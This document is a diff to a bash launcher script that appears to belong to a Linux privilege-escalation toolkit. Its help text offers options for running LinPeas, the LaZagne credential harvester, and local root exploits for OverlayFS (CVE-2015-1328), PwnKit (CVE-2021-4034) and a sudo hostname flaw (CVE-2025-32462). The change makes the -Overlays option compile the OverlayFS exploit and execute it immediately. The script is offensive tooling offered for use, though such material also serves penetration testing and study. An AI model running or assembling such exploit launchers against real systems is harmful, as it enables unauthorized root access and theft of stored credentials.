@@ -25,11 +25,7 @@ if [[ "$*" == "-help" ]]; then
     echo "Commands:"
     echo "   -LinPeas       Execute LinPeas"
     echo "   -LaZagne       Execute LaZagne"
-    echo " " 
-    echo "OverlaysFS:"
-    echo "   -OverC         Compile le script C#"
     echo "   -Overlays      Overlays64 - CVE-2015-1328"
-    echo " " 
     echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
     echo "   -SudoHost      Sudo Hostname - CVE-2025-32462"
     echo "   -check         Verifie si gcc est installer"
@@ -66,15 +62,13 @@ for arch in 64 32; do
      fi
 done
 
-# Compilation OverlayFS
-if [[ "$*" == "-OverC" ]]; then
-     gcc ${PWD}/exploit/Overlays/overlays.c -o ${PWD}/exploit/Overlays/overlays
-     echo "[+] Compilation successfuly !"
-fi
-
-# Execution OverlayFS
 if [[ "$*" == "-Overlays" ]]; then
-     "${PWD}/exploit/Overlays/overlays"
+     gcc ${PWD}/exploits/Overlays/overlays.c -o ${PWD}/exploits/Overlays/overlays
+     echo "[+] Compilation successfuly !"
+     echo "[+] PATH=${PWD}/exploits/Overlays/overlays"
+     echo "[+] Executing the binary..."
+     ${PWD}/exploits/Overlays/overlays
+
 fi
 
 # Sudo-Host
